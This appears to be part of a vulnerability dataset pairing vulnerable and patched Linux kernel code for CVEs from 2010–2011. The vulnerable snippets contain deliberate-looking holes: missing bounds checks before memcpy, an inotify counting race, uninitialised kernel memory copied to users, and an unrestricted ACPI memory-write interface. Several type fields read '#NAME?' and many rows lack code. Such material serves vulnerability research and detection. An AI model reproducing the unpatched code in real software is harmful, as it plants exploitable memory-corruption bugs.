 cFYI(1, ""Existing smb sess found (status=%d)"", ses->status);

"
2011,DoS ,CVE-2011-1581,,
2011,DoS Overflow ,CVE-2011-1577,,
2012,DoS ,CVE-2011-1573,,
2011,DoS +Priv Mem. Corr. +Info ,CVE-2011-1495,,
2011,DoS Overflow +Priv Mem. Corr. ,CVE-2011-1494,,
2012,DoS Mem. Corr. ,CVE-2011-1493,"				facilities->source_ndigis = 0;
				facilities->dest_ndigis   = 0;
 for (pt = p + 2, lg = 0 ; lg < l ; pt += AX25_ADDR_LEN, lg += AX25_ADDR_LEN) {
 if (pt[6] & AX25_HBIT)


 memcpy(&facilities->dest_digis[facilities->dest_ndigis++], pt, AX25_ADDR_LEN);
 else


 memcpy(&facilities->source_digis[facilities->source_ndigis++], pt, AX25_ADDR_LEN);

				}
			}
			p   += l + 2;

 case 0xC0:
			l = p[1];





 if (*p == FAC_CCITT_DEST_NSAP) {
 memcpy(&facilities->source_addr, p + 7, ROSE_ADDR_LEN);
 memcpy(callsign, p + 12,   l - 10);
 switch (*p) {
 case FAC_NATIONAL:		/* National */
				len = rose_parse_national(p + 1, facilities, facilities_len - 1);


				facilities_len -= len + 1;
				p += len + 1;
 break;

 case FAC_CCITT:		/* CCITT */
				len = rose_parse_ccitt(p + 1, facilities, facilities_len - 1);


				facilities_len -= len + 1;
				p += len + 1;
 break;
","				facilities->source_ndigis = 0;
				facilities->dest_ndigis   = 0;
 for (pt = p + 2, lg = 0 ; lg < l ; pt += AX25_ADDR_LEN, lg += AX25_ADDR_LEN) {
 if (pt[6] & AX25_HBIT) {
 if (facilities->dest_ndigis >= ROSE_MAX_DIGIS)
 return -1;
 memcpy(&facilities->dest_digis[facilities->dest_ndigis++], pt, AX25_ADDR_LEN);
					} else {
 if (facilities->source_ndigis >= ROSE_MAX_DIGIS)
 return -1;
 memcpy(&facilities->source_digis[facilities->source_ndigis++], pt, AX25_ADDR_LEN);
					}
				}
			}
			p   += l + 2;

 case 0xC0:
			l = p[1];

 /* Prevent overflows*/
 if (l < 10 || l > 20)
 return -1;

 if (*p == FAC_CCITT_DEST_NSAP) {
 memcpy(&facilities->source_addr, p + 7, ROSE_ADDR_LEN);
 memcpy(callsign, p + 12,   l - 10);
 switch (*p) {
 case FAC_NATIONAL:		/* National */
				len = rose_parse_national(p + 1, facilities, facilities_len - 1);
 if (len < 0)
 return 0;
				facilities_len -= len + 1;
				p += len + 1;
 break;

 case FAC_CCITT:		/* CCITT */
				len = rose_parse_ccitt(p + 1, facilities, facilities_len - 1);
 if (len < 0)
 return 0;
				facilities_len -= len + 1;
				p += len + 1;
 break;
"
2012,DoS ,CVE-2011-1479," idr_for_each(&group->inotify_data.idr, idr_callback, group);
 idr_remove_all(&group->inotify_data.idr);
 idr_destroy(&group->inotify_data.idr);

 free_uid(group->inotify_data.user);
}

static int inotify_release(struct inode *ignored, struct file *file)
{
 struct fsnotify_group *group = file->private_data;
 struct user_struct *user = group->inotify_data.user;

 pr_debug(""%s: group=%p\n"", __func__, group);

 /* free this group, matching get was inotify_init->fsnotify_obtain_group */
 fsnotify_put_group(group);

 atomic_dec(&user->inotify_devs);

 return 0;
}

 return ret;
}

static struct fsnotify_group *inotify_new_group(struct user_struct *user, unsigned int max_events)
{
 struct fsnotify_group *group;

 spin_lock_init(&group->inotify_data.idr_lock);
 idr_init(&group->inotify_data.idr);
	group->inotify_data.last_wd = 0;
	group->inotify_data.user = user;
	group->inotify_data.fa = NULL;








 return group;
}
SYSCALL_DEFINE1(inotify_init1, int, flags)
{
 struct fsnotify_group *group;
 struct user_struct *user;
 int ret;

 /* Check the IN_* constants for consistency.  */
 if (flags & ~(IN_CLOEXEC | IN_NONBLOCK))
 return -EINVAL;

	user = get_current_user();
 if (unlikely(atomic_read(&user->inotify_devs) >=
			inotify_max_user_instances)) {
		ret = -EMFILE;
 goto out_free_uid;
	}

 /* fsnotify_obtain_group took a reference to group, we put this when we kill the file in the end */
	group = inotify_new_group(user, inotify_max_queued_events);
 if (IS_ERR(group)) {
		ret = PTR_ERR(group);
 goto out_free_uid;
	}

 atomic_inc(&user->inotify_devs);

	ret = anon_inode_getfd(""inotify"", &inotify_fops, group,
				  O_RDONLY | flags);
 if (ret >= 0)
 return ret;

 fsnotify_put_group(group);
 atomic_dec(&user->inotify_devs);
out_free_uid:
 free_uid(user);
 return ret;
}

"," idr_for_each(&group->inotify_data.idr, idr_callback, group);
 idr_remove_all(&group->inotify_data.idr);
 idr_destroy(&group->inotify_data.idr);
 atomic_dec(&group->inotify_data.user->inotify_devs);
 free_uid(group->inotify_data.user);
}

static int inotify_release(struct inode *ignored, struct file *file)
{
 struct fsnotify_group *group = file->private_data;


 pr_debug(""%s: group=%p\n"", __func__, group);

 /* free this group, matching get was inotify_init->fsnotify_obtain_group */
 fsnotify_put_group(group);



 return 0;
}

 return ret;
}

static struct fsnotify_group *inotify_new_group(unsigned int max_events)
{
 struct fsnotify_group *group;

 spin_lock_init(&group->inotify_data.idr_lock);
 idr_init(&group->inotify_data.idr);
	group->inotify_data.last_wd = 0;

	group->inotify_data.fa = NULL;
	group->inotify_data.user = get_current_user();

 if (atomic_inc_return(&group->inotify_data.user->inotify_devs) >
	    inotify_max_user_instances) {
 fsnotify_put_group(group);
 return ERR_PTR(-EMFILE);
	}

 return group;
}
SYSCALL_DEFINE1(inotify_init1, int, flags)
{
 struct fsnotify_group *group;

 int ret;

 /* Check the IN_* constants for consistency.  */
 if (flags & ~(IN_CLOEXEC | IN_NONBLOCK))
 return -EINVAL;








 /* fsnotify_obtain_group took a reference to group, we put this when we kill the file in the end */
	group = inotify_new_group(inotify_max_queued_events);
 if (IS_ERR(group))
 return PTR_ERR(group);





	ret = anon_inode_getfd(""inotify"", &inotify_fops, group,
				  O_RDONLY | flags);
 if (ret < 0)
 fsnotify_put_group(group);





 return ret;
}

"
2011,DoS ,CVE-2011-1478,,
2012,DoS +Priv Mem. Corr. ,CVE-2011-1477,"
static void opl3_panning(int dev, int voice, int value)
{




	devc->voc[voice].panning = value;
}


static void opl3_setup_voice(int dev, int voice, int chn)
{
 struct channel_info *info =
	&synth_devs[dev]->chn_info[chn];








 opl3_set_instr(dev, voice, info->pgm_num);

","
static void opl3_panning(int dev, int voice, int value)
{

 if (voice < 0 || voice >= devc->nr_voice)
 return;

	devc->voc[voice].panning = value;
}


static void opl3_setup_voice(int dev, int voice, int chn)
{
 struct channel_info *info;

 if (voice < 0 || voice >= devc->nr_voice)
 return;

 if (chn < 0 || chn > 15)
 return;

	info = &synth_devs[dev]->chn_info[chn];

 opl3_set_instr(dev, voice, info->pgm_num);

"
2012,DoS Mem. Corr. ,CVE-2011-1476," void (*reset) (int dev);
 void (*hw_control) (int dev, unsigned char *event);
 int (*load_patch) (int dev, int format, const char __user *addr,
 int offs, int count, int pmgr_flag);
 void (*aftertouch) (int dev, int voice, int pressure);
 void (*controller) (int dev, int voice, int ctrl_num, int value);
 void (*panning) (int dev, int voice, int value);

int
midi_synth_load_patch(int dev, int format, const char __user *addr,
 int offs, int count, int pmgr_flag)
{
 int             orig_dev = synth_devs[dev]->midi_dev;

 if (!prefix_cmd(orig_dev, 0xf0))
 return 0;


 if (format != SYSEX_PATCH)
	{
/*		  printk(""MIDI Error: Invalid patch format (key) 0x%x\n"", format);*/
 return -EINVAL;
	}

 if (count < hdr_size)
	{
/*		printk(""MIDI Error: Patch header too short\n"");*/
 return -EINVAL;
	}
	count -= hdr_size;

 /*
	 * Copy the header from user space but ignore the first bytes which have
	 * been transferred already.
 */

 if(copy_from_user(&((char *) &sysex)[offs], &(addr)[offs], hdr_size - offs))
 return -EFAULT;

 if (count < sysex.len)
	{
/*		printk(KERN_WARNING ""MIDI Warning: Sysex record too short (%d<%d)\n"", count, (int) sysex.len);*/
		sysex.len = count;
	}
 	left = sysex.len;
 	src_offs = 0;

 for (i = 0; i < left && !signal_pending(current); i++)
	{
void midi_synth_close (int dev);
void midi_synth_hw_control (int dev, unsigned char *event);
int midi_synth_load_patch (int dev, int format, const char __user * addr,
 int offs, int count, int pmgr_flag);
void midi_synth_panning (int dev, int channel, int pressure);
void midi_synth_aftertouch (int dev, int channel, int pressure);
void midi_synth_controller (int dev, int channel, int ctrl_num, int value);
}

static int opl3_load_patch(int dev, int format, const char __user *addr,
 int offs, int count, int pmgr_flag)
{
 struct sbi_instrument ins;

 return -EINVAL;
	}

 /*
	 * What the fuck is going on here?  We leave junk in the beginning
	 * of ins and then check the field pretty close to that beginning?
 */
 if(copy_from_user(&((char *) &ins)[offs], addr + offs, sizeof(ins) - offs))
 return -EFAULT;

 if (ins.channel < 0 || ins.channel >= SBFM_MAXINSTR)
 return -ENXIO;

			fmt = (*(short *) &event_rec[0]) & 0xffff;
			err = synth_devs[dev]->load_patch(dev, fmt, buf, p + 4, c, 0);
 if (err < 0)
 return err;

"," void (*reset) (int dev);
 void (*hw_control) (int dev, unsigned char *event);
 int (*load_patch) (int dev, int format, const char __user *addr,
 int count, int pmgr_flag);
 void (*aftertouch) (int dev, int voice, int pressure);
 void (*controller) (int dev, int voice, int ctrl_num, int value);
 void (*panning) (int dev, int voice, int value);

int
midi_synth_load_patch(int dev, int format, const char __user *addr,
 int count, int pmgr_flag)
{
 int             orig_dev = synth_devs[dev]->midi_dev;

 if (!prefix_cmd(orig_dev, 0xf0))
 return 0;

 /* Invalid patch format */
 if (format != SYSEX_PATCH)


 return -EINVAL;

 /* Patch header too short */
 if (count < hdr_size)


 return -EINVAL;

	count -= hdr_size;

 /*
	 * Copy the header from user space

 */

 if (copy_from_user(&sysex, addr, hdr_size))
 return -EFAULT;

 /* Sysex record too short */
 if ((unsigned)count < (unsigned)sysex.len)

		sysex.len = count;

	left = sysex.len;
	src_offs = 0;

 for (i = 0; i < left && !signal_pending(current); i++)
	{
void midi_synth_close (int dev);
void midi_synth_hw_control (int dev, unsigned char *event);
int midi_synth_load_patch (int dev, int format, const char __user * addr,
 int count, int pmgr_flag);
void midi_synth_panning (int dev, int channel, int pressure);
void midi_synth_aftertouch (int dev, int channel, int pressure);
void midi_synth_controller (int dev, int channel, int ctrl_num, int value);
}

static int opl3_load_patch(int dev, int format, const char __user *addr,
 int count, int pmgr_flag)
{
 struct sbi_instrument ins;

 return -EINVAL;
	}

 if (copy_from_user(&ins, addr, sizeof(ins)))




 return -EFAULT;

 if (ins.channel < 0 || ins.channel >= SBFM_MAXINSTR)
 return -ENXIO;

			fmt = (*(short *) &event_rec[0]) & 0xffff;
			err = synth_devs[dev]->load_patch(dev, fmt, buf + p, c, 0);
 if (err < 0)
 return err;

"
2019,,CVE-2011-1474,,
2013,,CVE-2011-1182," return -EFAULT;

 /* Not even root can pretend to send signals from the kernel.
	   Nor can they impersonate a kill(), which adds source info.  */
 if (info.si_code >= 0)



 return -EPERM;

	info.si_signo = sig;

 /* POSIX.1b doesn't mention process groups.  */
 return -EINVAL;

 /* Not even root can pretend to send signals from the kernel.
	   Nor can they impersonate a kill(), which adds source info.  */
 if (info->si_code >= 0)



 return -EPERM;

	info->si_signo = sig;

 return do_send_specific(tgid, pid, sig, info);
"," return -EFAULT;

 /* Not even root can pretend to send signals from the kernel.
	 * Nor can they impersonate a kill()/tgkill(), which adds source info.
 */
 if (info.si_code != SI_QUEUE) {
 /* We used to allow any < 0 si_code */
 WARN_ON_ONCE(info.si_code < 0);
 return -EPERM;
	}
	info.si_signo = sig;

 /* POSIX.1b doesn't mention process groups.  */
 return -EINVAL;

 /* Not even root can pretend to send signals from the kernel.
	 * Nor can they impersonate a kill()/tgkill(), which adds source info.
 */
 if (info->si_code != SI_QUEUE) {
 /* We used to allow any < 0 si_code */
 WARN_ON_ONCE(info->si_code < 0);
 return -EPERM;
	}
	info->si_signo = sig;

 return do_send_specific(tgid, pid, sig, info);
"
2013,DoS Overflow Mem. Corr. ,CVE-2011-1180,"	n = 1;

	name_len = fp[n++];



 memcpy(name, fp+n, name_len); n+=name_len;
	name[name_len] = '\0';

	attr_len = fp[n++];



 memcpy(attr, fp+n, attr_len); n+=attr_len;
	attr[attr_len] = '\0';

","	n = 1;

	name_len = fp[n++];

 IRDA_ASSERT(name_len < IAS_MAX_CLASSNAME + 1, return;);

 memcpy(name, fp+n, name_len); n+=name_len;
	name[name_len] = '\0';

	attr_len = fp[n++];

 IRDA_ASSERT(attr_len < IAS_MAX_ATTRIBNAME + 1, return;);

 memcpy(attr, fp+n, attr_len); n+=attr_len;
	attr[attr_len] = '\0';

"
2011,#NAME?,CVE-2011-1173,,
2011,#NAME?,CVE-2011-1172,,
2011,#NAME?,CVE-2011-1171,,
2011,#NAME?,CVE-2011-1170,,
2011,DoS +Priv Mem. Corr. ,CVE-2011-1169,,
2011,#NAME?,CVE-2011-1163,,
2012,#NAME?,CVE-2011-1162,,
2012,#NAME?,CVE-2011-1160," return -EBUSY;
	}

	chip->data_buffer = kmalloc(TPM_BUFSIZE * sizeof(u8), GFP_KERNEL);
 if (chip->data_buffer == NULL) {
 clear_bit(0, &chip->is_open);
 put_device(chip->dev);
"," return -EBUSY;
	}

	chip->data_buffer = kzalloc(TPM_BUFSIZE, GFP_KERNEL);
 if (chip->data_buffer == NULL) {
 clear_bit(0, &chip->is_open);
 put_device(chip->dev);
"
2011,DoS ,CVE-2011-1093,,
2011,DoS ,CVE-2011-1090,,
2011,DoS ,CVE-2011-1083,,
2011,DoS ,CVE-2011-1082,,
2012,#NAME?,CVE-2011-1080," if (tmp.num_counters >= INT_MAX / sizeof(struct ebt_counter))
 return -ENOMEM;



	countersize = COUNTER_OFFSET(tmp.nentries) * nr_cpu_ids;
	newinfo = vmalloc(sizeof(*newinfo) + countersize);
 if (!newinfo)
"," if (tmp.num_counters >= INT_MAX / sizeof(struct ebt_counter))
 return -ENOMEM;

	tmp.name[sizeof(tmp.name) - 1] = 0;

	countersize = COUNTER_OFFSET(tmp.nentries) * nr_cpu_ids;
	newinfo = vmalloc(sizeof(*newinfo) + countersize);
 if (!newinfo)
"
2012,DoS +Info ,CVE-2011-1079," sockfd_put(nsock);
 return -EBADFD;
		}


		err = bnep_add_connection(&ca, nsock);
 if (!err) {
"," sockfd_put(nsock);
 return -EBADFD;
		}
		ca.device[sizeof(ca.device)-1] = 0;

		err = bnep_add_connection(&ca, nsock);
 if (!err) {
"
2012,#NAME?,CVE-2011-1078," break;
		}


		cinfo.hci_handle = sco_pi(sk)->conn->hcon->handle;
 memcpy(cinfo.dev_class, sco_pi(sk)->conn->hcon->dev_class, 3);

"," break;
		}

 memset(&cinfo, 0, sizeof(cinfo));
		cinfo.hci_handle = sco_pi(sk)->conn->hcon->handle;
 memcpy(cinfo.dev_class, sco_pi(sk)->conn->hcon->dev_class, 3);

"
2011,DoS ,CVE-2011-1076,,
2011,#NAME?,CVE-2011-1044,,
2012,DoS ,CVE-2011-1023," if (conn->c_loopback
	    && rm->m_inc.i_hdr.h_flags & RDS_FLAG_CONG_BITMAP) {
 rds_cong_map_updated(conn->c_fcong, ~(u64) 0);
 return sizeof(struct rds_header) + RDS_CONG_MAP_BYTES;



	}

 /* FIXME we may overallocate here */
 unsigned int hdr_off, unsigned int sg,
 unsigned int off)
{




 /* Do not send cong updates to loopback */
 if (rm->m_inc.i_hdr.h_flags & RDS_FLAG_CONG_BITMAP) {
 rds_cong_map_updated(conn->c_fcong, ~(u64) 0);
 return sizeof(struct rds_header) + RDS_CONG_MAP_BYTES;

	}

 BUG_ON(hdr_off || sg || off);
 NULL);

 rds_inc_put(&rm->m_inc);

 return sizeof(struct rds_header) + be32_to_cpu(rm->m_inc.i_hdr.h_len);
}

/*
"," if (conn->c_loopback
	    && rm->m_inc.i_hdr.h_flags & RDS_FLAG_CONG_BITMAP) {
 rds_cong_map_updated(conn->c_fcong, ~(u64) 0);
		scat = &rm->data.op_sg[sg];
		ret = sizeof(struct rds_header) + RDS_CONG_MAP_BYTES;
		ret = min_t(int, ret, scat->length - conn->c_xmit_data_off);
 return ret;
	}

 /* FIXME we may overallocate here */
 unsigned int hdr_off, unsigned int sg,
 unsigned int off)
{
 struct scatterlist *sgp = &rm->data.op_sg[sg];
 int ret = sizeof(struct rds_header) +
 be32_to_cpu(rm->m_inc.i_hdr.h_len);

 /* Do not send cong updates to loopback */
 if (rm->m_inc.i_hdr.h_flags & RDS_FLAG_CONG_BITMAP) {
 rds_cong_map_updated(conn->c_fcong, ~(u64) 0);
		ret = min_t(int, ret, sgp->length - conn->c_xmit_data_off);
 goto out;
	}

 BUG_ON(hdr_off || sg || off);
 NULL);

 rds_inc_put(&rm->m_inc);
out:
 return ret;
}

/*
"
2012,,CVE-2011-1021,"      But each individual write to debugfs can implement a SINGLE
      method override. i.e. if we want to insert/override multiple
      ACPI methods, we need to redo step c) ~ g) for multiple times.





	  which is used to report some hardware errors notified via
	  SCI, mainly the corrected errors.
















source ""drivers/acpi/apei/Kconfig""

endif	# ACPI
obj-$(CONFIG_ACPI_POWER_METER)	+= power_meter.o
obj-$(CONFIG_ACPI_HED)		+= hed.o
obj-$(CONFIG_ACPI_EC_DEBUGFS)	+= ec_sys.o


# processor has its own ""processor."" module_param namespace
processor-y			:= processor_driver.o processor_throttling.o




































































































 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/debugfs.h>
#include <acpi/acpi_drivers.h>

#define _COMPONENT		ACPI_SYSTEM_COMPONENT
ACPI_MODULE_NAME(""debugfs"");

struct dentry *acpi_debugfs_dir;
static struct dentry *cm_dentry;

/* /sys/kernel/debug/acpi/custom_method */

static ssize_t cm_write(struct file *file, const char __user * user_buf,
 size_t count, loff_t *ppos)
{
 static char *buf;
 static u32 max_size;
 static u32 uncopied_bytes;

 struct acpi_table_header table;
	acpi_status status;

 if (!(*ppos)) {
 /* parse the table header to get the table length */
 if (count <= sizeof(struct acpi_table_header))
 return -EINVAL;
 if (copy_from_user(&table, user_buf,
 sizeof(struct acpi_table_header)))
 return -EFAULT;
		uncopied_bytes = max_size = table.length;
		buf = kzalloc(max_size, GFP_KERNEL);
 if (!buf)
 return -ENOMEM;
	}

 if (buf == NULL)
 return -EINVAL;

 if ((*ppos > max_size) ||
	    (*ppos + count > max_size) ||
	    (*ppos + count < count) ||
	    (count > uncopied_bytes))
 return -EINVAL;

 if (copy_from_user(buf + (*ppos), user_buf, count)) {
 kfree(buf);
		buf = NULL;
 return -EFAULT;
	}

	uncopied_bytes -= count;
	*ppos += count;

 if (!uncopied_bytes) {
		status = acpi_install_method(buf);
 kfree(buf);
		buf = NULL;
 if (ACPI_FAILURE(status))
 return -EINVAL;
 add_taint(TAINT_OVERRIDDEN_ACPI_TABLE);
	}

 return count;
}

static const struct file_operations cm_fops = {
	.write = cm_write,
	.llseek = default_llseek,
};

static int __init acpi_custom_method_init(void)
{
 if (!acpi_debugfs_dir)
 return -ENOENT;

	cm_dentry = debugfs_create_file(""custom_method"", S_IWUSR,
					acpi_debugfs_dir, NULL, &cm_fops);
 if (!cm_dentry)
 return -ENODEV;

 return 0;
}

void __init acpi_debugfs_init(void)
{
	acpi_debugfs_dir = debugfs_create_dir(""acpi"", NULL);

 acpi_custom_method_init();
}
","      But each individual write to debugfs can implement a SINGLE
      method override. i.e. if we want to insert/override multiple
      ACPI methods, we need to redo step c) ~ g) for multiple times.

Note: Be aware that root can mis-use this driver to modify arbitrary
      memory and gain additional rights, if root's privileges got
      restricted (for example if root is not allowed to load additional
      modules after boot).
	  which is used to report some hardware errors notified via
	  SCI, mainly the corrected errors.

config ACPI_CUSTOM_METHOD
	tristate ""Allow ACPI methods to be inserted/replaced at run time""
	depends on DEBUG_FS
	default n
	help
	  This debug facility allows ACPI AML methods to me inserted and/or
	  replaced without rebooting the system. For details refer to:
	  Documentation/acpi/method-customizing.txt.

	  NOTE: This option is security sensitive, because it allows arbitrary
	  kernel memory to be written to by root (uid=0) users, allowing them
	  to bypass certain security measures (e.g. if root is not allowed to
	  load additional kernel modules after boot, this feature may be used
	  to override that restriction).

source ""drivers/acpi/apei/Kconfig""

endif	# ACPI
obj-$(CONFIG_ACPI_POWER_METER)	+= power_meter.o
obj-$(CONFIG_ACPI_HED)		+= hed.o
obj-$(CONFIG_ACPI_EC_DEBUGFS)	+= ec_sys.o
obj-$(CONFIG_ACPI_CUSTOM_METHOD)+= custom_method.o

# processor has its own ""processor."" module_param namespace
processor-y			:= processor_driver.o processor_throttling.o
/*
 * debugfs.c - ACPI debugfs interface to userspace.
 */

#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/uaccess.h>
#include <linux/debugfs.h>
#include <acpi/acpi_drivers.h>

#include ""internal.h""

#define _COMPONENT		ACPI_SYSTEM_COMPONENT
ACPI_MODULE_NAME(""custom_method"");
MODULE_LICENSE(""GPL"");

static struct dentry *cm_dentry;

/* /sys/kernel/debug/acpi/custom_method */

static ssize_t cm_write(struct file *file, const char __user * user_buf,
 size_t count, loff_t *ppos)
{
 static char *buf;
 static u32 max_size;
 static u32 uncopied_bytes;

 struct acpi_table_header table;
	acpi_status status;

 if (!(*ppos)) {
 /* parse the table header to get the table length */
 if (count <= sizeof(struct acpi_table_header))
 return -EINVAL;
 if (copy_from_user(&table, user_buf,
 sizeof(struct acpi_table_header)))
 return -EFAULT;
		uncopied_bytes = max_size = table.length;
		buf = kzalloc(max_size, GFP_KERNEL);
 if (!buf)
 return -ENOMEM;
	}

 if (buf == NULL)
 return -EINVAL;

 if ((*ppos > max_size) ||
	    (*ppos + count > max_size) ||
	    (*ppos + count < count) ||
	    (count > uncopied_bytes))
 return -EINVAL;

 if (copy_from_user(buf + (*ppos), user_buf, count)) {
 kfree(buf);
		buf = NULL;
 return -EFAULT;
	}

	uncopied_bytes -= count;
	*ppos += count;

 if (!uncopied_bytes) {
		status = acpi_install_method(buf);
 kfree(buf);
		buf = NULL;
 if (ACPI_FAILURE(status))
 return -EINVAL;
 add_taint(TAINT_OVERRIDDEN_ACPI_TABLE);
	}

 return count;
}

static const struct file_operations cm_fops = {
	.write = cm_write,
	.llseek = default_llseek,
};

static int __init acpi_custom_method_init(void)
{
 if (acpi_debugfs_dir == NULL)
 return -ENOENT;

	cm_dentry = debugfs_create_file(""custom_method"", S_IWUSR,
					acpi_debugfs_dir, NULL, &cm_fops);
 if (cm_dentry == NULL)
 return -ENODEV;

 return 0;
}

static void __exit acpi_custom_method_exit(void)
{
 if (cm_dentry)
 debugfs_remove(cm_dentry);
 }

module_init(acpi_custom_method_init);
module_exit(acpi_custom_method_exit);
 */

#include <linux/init.h>



#include <linux/debugfs.h>
#include <acpi/acpi_drivers.h>

#define _COMPONENT		ACPI_SYSTEM_COMPONENT
ACPI_MODULE_NAME(""debugfs"");

struct dentry *acpi_debugfs_dir;
EXPORT_SYMBOL_GPL(acpi_debugfs_dir);










































































void __init acpi_debugfs_init(void)
{
	acpi_debugfs_dir = debugfs_create_dir(""acpi"", NULL);


}
"
2011,DoS +Info ,CVE-2011-1020,,
2013,Bypass ,CVE-2011-1019,"extern int netdev_info(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));




#if defined(DEBUG)
#define netdev_dbg(__dev, format, args...)			\
 netdev_printk(KERN_DEBUG, __dev, format, ##args)
void dev_load(struct net *net, const char *name)
{
 struct net_device *dev;


 rcu_read_lock();
	dev = dev_get_by_name_rcu(net, name);
 rcu_read_unlock();

 if (!dev && capable(CAP_NET_ADMIN))
 request_module(""%s"", name);







}
EXPORT_SYMBOL(dev_load);

MODULE_LICENSE(""GPL"");
MODULE_ALIAS_RTNL_LINK(""gre"");
MODULE_ALIAS_RTNL_LINK(""gretap"");
MODULE_ALIAS(""gre0"");
module_init(ipip_init);
module_exit(ipip_fini);
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""tunl0"");
module_init(sit_init);
module_exit(sit_cleanup);
MODULE_LICENSE(""GPL"");
MODULE_ALIAS(""sit0"");
","extern int netdev_info(const struct net_device *dev, const char *format, ...)
	__attribute__ ((format (printf, 2, 3)));

#define MODULE_ALIAS_NETDEV(device) \
 MODULE_ALIAS(""netdev-"" device)

#if defined(DEBUG)
#define netdev_dbg(__dev, format, args...)			\
 netdev_printk(KERN_DEBUG, __dev, format, ##args)
void dev_load(struct net *net, const char *name)
{
 struct net_device *dev;
 int no_module;

 rcu_read_lock();
	dev = dev_get_by_name_rcu(net, name);
 rcu_read_unlock();

	no_module = !dev;
 if (no_module && capable(CAP_NET_ADMIN))
		no_module = request_module(""netdev-%s"", name);
 if (no_module && capable(CAP_SYS_MODULE)) {
 if (!request_module(""%s"", name))
 pr_err(""Loading kernel module for a network device ""
""with CAP_SYS_MODULE (deprecated).  Use CAP_NET_ADMIN and alias netdev-%s ""
""instead\n"", name);
	}
}
EXPORT_SYMBOL(dev_load);

MODULE_LICENSE(""GPL"");
MODULE_ALIAS_RTNL_LINK(""gre"");
MODULE_ALIAS_RTNL_LINK(""gretap"");
MODULE_ALIAS_NETDEV(""gre0"");
module_init(ipip_init);
module_exit(ipip_fini);
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_NETDEV(""tunl0"");
module_init(sit_init);
module_exit(sit_cleanup);
MODULE_LICENSE(""GPL"");
MODULE_ALIAS_NETDEV(""sit0"");
"
2011,Overflow +Priv +Info ,CVE-2011-1017,,
2011,,CVE-2011-1016,,
2011,DoS ,CVE-2011-1013,,
2011,DoS ,CVE-2011-1012,,
2011,DoS Overflow ,CVE-2011-1010,,
2011,DoS ,CVE-2011-0999,,
2011,,CVE-2011-0726,,
2012,DoS Mem. Corr. ,CVE-2011-0716," goto err;

 if (!port) {
 hlist_add_head(&mp->mglist, &br->mglist);

 mod_timer(&mp->timer, now + br->multicast_membership_interval);
 goto out;
	}
"," goto err;

 if (!port) {
 if (hlist_unhashed(&mp->mglist))
 hlist_add_head(&mp->mglist, &br->mglist);
 mod_timer(&mp->timer, now + br->multicast_membership_interval);
 goto out;
	}
"
2011,DoS Overflow ,CVE-2011-0712,,
2011,#NAME?,CVE-2011-0711,,
2011,#NAME?,CVE-2011-0710,,
2011,DoS ,CVE-2011-0709,,
2020,DoS Overflow ,CVE-2011-0699,,
2011,DoS ,CVE-2011-0695,,
2011,,CVE-2011-0640,,
2011,DoS Overflow Mem. Corr. ,CVE-2011-0521,,
2011,#NAME?,CVE-2011-0463,,
2012,Bypass ,CVE-2011-0006,"	result = security_filter_rule_init(entry->lsm[lsm_rule].type,
					   Audit_equal, args,
					   &entry->lsm[lsm_rule].rule);


 return result;
}

","	result = security_filter_rule_init(entry->lsm[lsm_rule].type,
					   Audit_equal, args,
					   &entry->lsm[lsm_rule].rule);
 if (!entry->lsm[lsm_rule].rule)
 return -EINVAL;
 return result;
}

"
2019,Overflow ,CVE-2010-5332," goto out;
		}
	}






 mlx4_dbg(dev, ""Free MAC index is %d\n"", free);

 if (table->total == table->max) {
		}
	}






 if (table->total == table->max) {
 /* No free vlan entries */
		err = -ENOSPC;
"," goto out;
		}
	}

 if (free < 0) {
		err = -ENOMEM;
 goto out;
	}

 mlx4_dbg(dev, ""Free MAC index is %d\n"", free);

 if (table->total == table->max) {
		}
	}

 if (free < 0) {
		err = -ENOMEM;
 goto out;
	}

 if (table->total == table->max) {
 /* No free vlan entries */
		err = -ENOSPC;
"
2019,Overflow ,CVE-2010-5331,"  UCHAR                    ucTV_BootUpDefaultStandard; 
  UCHAR                    ucExt_TV_ASIC_ID;
  UCHAR                    ucExt_TV_ASIC_SlaveAddr;
  ATOM_DTD_FORMAT          aModeTimings[MAX_SUPPORTED_TV_TIMING];
}ATOM_ANALOG_TV_INFO_V1_2;

typedef struct _ATOM_DPCD_INFO
 switch (crev) {
 case 1:
		tv_info = (ATOM_ANALOG_TV_INFO *)(mode_info->atom_context->bios + data_offset);
 if (index > MAX_SUPPORTED_TV_TIMING)
 return false;

		mode->crtc_htotal = le16_to_cpu(tv_info->aModeTimings[index].usCRTC_H_Total);
 break;
 case 2:
		tv_info_v1_2 = (ATOM_ANALOG_TV_INFO_V1_2 *)(mode_info->atom_context->bios + data_offset);
 if (index > MAX_SUPPORTED_TV_TIMING_V1_2)
 return false;

		dtd_timings = &tv_info_v1_2->aModeTimings[index];
","  UCHAR                    ucTV_BootUpDefaultStandard; 
  UCHAR                    ucExt_TV_ASIC_ID;
  UCHAR                    ucExt_TV_ASIC_SlaveAddr;
  ATOM_DTD_FORMAT          aModeTimings[MAX_SUPPORTED_TV_TIMING_V1_2];
}ATOM_ANALOG_TV_INFO_V1_2;

typedef struct _ATOM_DPCD_INFO
 switch (crev) {
 case 1:
		tv_info = (ATOM_ANALOG_TV_INFO *)(mode_info->atom_context->bios + data_offset);
 if (index >= MAX_SUPPORTED_TV_TIMING)
 return false;

		mode->crtc_htotal = le16_to_cpu(tv_info->aModeTimings[index].usCRTC_H_Total);
 break;
 case 2:
		tv_info_v1_2 = (ATOM_ANALOG_TV_INFO_V1_2 *)(mode_info->atom_context->bios + data_offset);
 if (index >= MAX_SUPPORTED_TV_TIMING_V1_2)
 return false;

		dtd_timings = &tv_info_v1_2->aModeTimings[index];
"
2017,DoS ,CVE-2010-5329,"}
EXPORT_SYMBOL(v4l_printk_ioctl);

/*
 * helper function -- handles userspace copying for ioctl arguments
 * Obsolete usercopy function - Should be removed soon
 */
long
video_usercopy(struct file *file, unsigned int cmd, unsigned long arg,
		v4l2_kioctl func)
{
 char	sbuf[128];
 void    *mbuf = NULL;
 void	*parg = NULL;
 long	err  = -EINVAL;
 int     is_ext_ctrl;
 size_t  ctrls_size = 0;
 void __user *user_ptr = NULL;

	is_ext_ctrl = (cmd == VIDIOC_S_EXT_CTRLS || cmd == VIDIOC_G_EXT_CTRLS ||
		       cmd == VIDIOC_TRY_EXT_CTRLS);

